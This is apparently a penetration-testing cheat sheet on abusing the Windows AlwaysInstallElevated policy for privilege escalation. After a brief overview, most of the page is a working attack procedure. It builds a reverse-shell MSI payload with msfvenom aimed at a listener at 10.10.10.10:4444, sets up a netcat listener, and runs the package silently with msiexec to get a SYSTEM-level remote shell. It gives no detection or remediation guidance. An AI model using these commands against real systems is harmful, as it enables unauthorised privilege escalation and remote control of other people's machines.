# Always Install Elevated

#### **Overview**

The **Always Install Elevated** policy is a setting in Windows that allows standard users to install applications with elevated privileges. When this policy is enabled, any application installation initiated by a standard user can run with administrative rights, effectively bypassing User Account Control (UAC) prompts.

#### **How It Works**

When the **Always Install Elevated** setting is enabled, the following occurs:

1. **Elevation of Installations**: Standard users can install applications without being prompted for administrator credentials. This means that any MSI (Microsoft Installer) package executed will run with elevated permissions.
2. **UAC Bypass**: Users do not see the standard UAC prompt, which can prevent them from being aware of the risks associated with the installation of potentially harmful software.

#### **Creating and Executing a Malicious MSI Package for Reverse Shell Access**

1. **Generate the Malicious MSI Package**:
   * Use `msfvenom` to create a malicious MSI file that will initiate a reverse shell connection back to your listener. In this example, the local host (LHOST) is set to `10.10.10.10`, and the local port (LPORT) is set to `4444`.
   *   The command to generate the MSI package is as follows:

       ```bash
       dollarboysushil@kali$ msfvenom -p windows/shell_reverse_tcp lhost=10.10.10.10 lport=4444 -f msi > dbs.msi
       ```
2. **Transfer the MSI File**:
   * After generating the `dbs.msi` file, transfer it to the target machine where you want to execute it.
3. **Set Up a Netcat Listener**:
   *   On your attacking machine, set up a netcat listener to catch the reverse shell once the MSI package is executed:

       ```bash
       nc -lnvp 4444
       ```
4. **Execute the MSI Package**:
   *   On the target machine, run the following command to execute the malicious MSI package quietly, without displaying any prompts or restarting the system:

       ```cmd
       C:\> msiexec /i c:\users\dollarboysushil\desktop\dbs.msi /quiet /qn /norestart
       ```

After executing this command, the target machine will connect back to your listener, providing you with a reverse shell with system privileges.
